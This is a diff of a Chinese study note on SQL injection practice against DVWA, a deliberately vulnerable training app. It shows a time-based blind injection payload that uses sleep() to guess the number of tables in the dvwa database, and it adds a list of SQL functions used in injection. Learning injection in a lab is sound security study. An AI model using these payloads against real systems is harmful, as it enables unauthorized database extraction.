@@ -25,4 +25,13 @@
 
 时间盲注形式上有一点不同，但原理还是猜猜猜：依旧猜dvwa数据库里面的表数
 `1' and if((select count(table_name) from information_schema.tables where table_schema='dvwa')=8,sleep(5),1)#`
+
+## 3.补充一些常用函数
+* `length()`猜名字长度时使用
+* `group_concat()`
+* `concat_ws()`
+* `count()`
+* `database()`
+* `version()`
   
+  这里只是补充，后续还有再进行补充，具体使用问AI，即学即用
